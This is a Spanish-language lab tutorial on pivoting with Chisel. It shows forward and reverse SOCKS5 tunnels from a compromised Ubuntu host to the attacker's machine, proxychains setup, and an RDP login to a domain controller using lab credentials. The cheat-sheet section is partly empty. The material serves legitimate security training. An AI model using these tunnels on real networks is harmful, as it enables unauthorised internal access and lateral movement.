
## 1. ¿Qué es Chisel?

**Chisel** es una herramienta de tunneling escrita en Go que utiliza HTTP para transportar datos protegidos mediante SSH. Permite crear túneles entre un cliente y un servidor para acceder a redes internas desde un host comprometido.

- **Host de ataque:** nuestra máquina.
    
- **Host pivote:** máquina comprometida con acceso a la red interna.
    
- **Servidor Chisel:** escucha las conexiones entrantes.
    
- **Cliente Chisel:** establece la conexión con el servidor.
    
- **SOCKS5:** permite enrutar tráfico de herramientas como `proxychains` a través del túnel.
    

Ejemplo del laboratorio:

|Máquina|Dirección IP|
|---|---|
|Máquina de ataque|`10.10.14.17`|
|Host pivote Ubuntu|`10.129.202.64`|
|Controlador de dominio (DC)|`172.16.5.19`|
|Red interna|`172.16.5.0/23`|

---

## 2. Instalar y compilar Chisel

Clonar el repositorio:

```
git clone https://github.com/jpillora/chisel.git
cd chisel
```

Compilar el binario; es necesario tener Go instalado:

```
go build
```

Esto genera el ejecutable `chisel`.

### Transferir Chisel al host pivote

Desde la máquina de ataque:

```
scp chisel ubuntu@10.129.202.64:~/
```

**Nota:** si el binario falla al ejecutarse en el objetivo, puede haber incompatibilidades relacionadas con la versión de `glibc`. Prueba otra versión de Chisel, incluida alguna versión precompilada disponible en los releases del proyecto.

## 3. Túnel SOCKS5 directo

En este escenario, el host pivote ejecuta el servidor Chisel y nuestra máquina de ataque se conecta a él.

### Paso 1. Iniciar el servidor en el host pivote

En Ubuntu:

```
./chisel server -v -p 1234 --socks5
```

- `server`: inicia el servidor Chisel.
    
- `-v`: muestra información detallada.
    
- `-p 1234`: escucha en el puerto `1234`.
    
- `--socks5`: habilita el uso del proxy SOCKS5.
    

Salida esperada:

```
server: Listening on http://0.0.0.0:1234
```

El host pivote podrá reenviar el tráfico hacia las redes a las que tenga acceso.

### Paso 2. Conectar el cliente desde la máquina de ataque

```
./chisel client -v 10.129.202.64:1234 socks
```

El cliente establece el túnel y crea un proxy SOCKS local:

```
tun: proxy#127.0.0.1:1080=>socks: Listening
Connected
tun: SSH connected
```

El proxy SOCKS5 estará disponible en:

```
127.0.0.1:1080
```

### Paso 3. Configurar Proxychains

Editar el archivo de configuración:

```
sudo nano /etc/proxychains.conf
```

Añadir al final de la sección `[ProxyList]`:

```
socks5 127.0.0.1 1080
```

Comprobar la configuración:

```
tail -f /etc/proxychains.conf
```

### Paso 4. Acceder al controlador de dominio

Utilizar `proxychains` para enrutar la conexión RDP hacia el DC de la red interna:

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Flujo de conexión:**

```
Máquina de ataque
       |
       | Proxychains
       v
127.0.0.1:1080 (SOCKS5)
       |
       | Túnel Chisel
       v
10.129.202.64 (Ubuntu / host pivote)
       |
       v
172.16.5.19 (Domain Controller)
```

## 4. Pivote inverso con Chisel (Reverse SOCKS)

El túnel directo requiere que el host pivote acepte conexiones entrantes. Si las reglas del firewall las bloquean, podemos utilizar un **pivote inverso**.

En este escenario:

- La máquina de ataque ejecuta el servidor Chisel.
    
- El host pivote inicia la conexión hacia nuestra máquina.
    
- El servidor de ataque recibe el tráfico a través del túnel inverso.
    

### Paso 1. Iniciar el servidor en la máquina de ataque

```
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Parámetros importantes:

- `--reverse`: habilita el tunneling inverso.
    
- `-v`: muestra información detallada.
    
- `-p 1234`: escucha en el puerto `1234`.
    
- `--socks5`: habilita el soporte SOCKS5.
    

Salida esperada:

```
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:1234
```

### Paso 2. Conectar desde el host pivote

En Ubuntu:

```
./chisel client -v 10.10.14.17:1234 R:socks
```

- `10.10.14.17:1234`: dirección y puerto del servidor Chisel en la máquina de ataque.
    
- `R:socks`: crea un túnel SOCKS inverso.
    

El cliente establece la conexión hacia nuestra máquina de ataque y el servidor expone el proxy SOCKS inverso en su puerto predeterminado `1080`.

### Paso 3. Configurar Proxychains

En la máquina de ataque, editar:

```
sudo nano /etc/proxychains.conf
```

Añadir:

```
socks5 127.0.0.1 1080
```

### Paso 4. Acceder al DC mediante el túnel inverso

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## 5. Diferencias entre túnel directo e inverso

|Característica|Túnel directo|Túnel inverso|
|---|---|---|
|Servidor Chisel|Host pivote|Máquina de ataque|
|Cliente Chisel|Máquina de ataque|Host pivote|
|Quién inicia la conexión|Ataque → pivote|Pivote → ataque|
|Comando del servidor|`./chisel server -v -p 1234 --socks5`|`sudo ./chisel server --reverse -v -p 1234 --socks5`|
|Comando del cliente|`./chisel client -v 10.129.202.64:1234 socks`|`./chisel client -v 10.10.14.17:1234 R:socks`|
|Caso de uso|El pivote acepta conexiones entrantes|El firewall restringe las conexiones entrantes al pivote|

## 6. Chuleta de comandos

```

```


### Túnel inverso

**Máquina de ataque:**

```
sudo ./chisel server --reverse -v -p 1234 --socks5

```

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## 7. Consideraciones importantes

- Comprueba que el cliente y el servidor Chisel estén utilizando versiones compatibles.
    
- Si el binario falla en el objetivo, prueba una versión diferente de Chisel.
    
- El puerto local `1080` es el proxy SOCKS utilizado en los ejemplos.
    
- Configura `proxychains` para utilizar el proxy correcto.
    
- El túnel solo permite acceder a los destinos alcanzables desde el host pivote.
    
- En un túnel inverso, el parámetro `--reverse` debe habilitarse en el servidor y el cliente debe utilizar `R:socks`.
    
- El túnel inverso resulta útil cuando el host comprometido no puede aceptar conexiones entrantes, pero sí puede iniciar conexiones hacia la máquina de ataque.
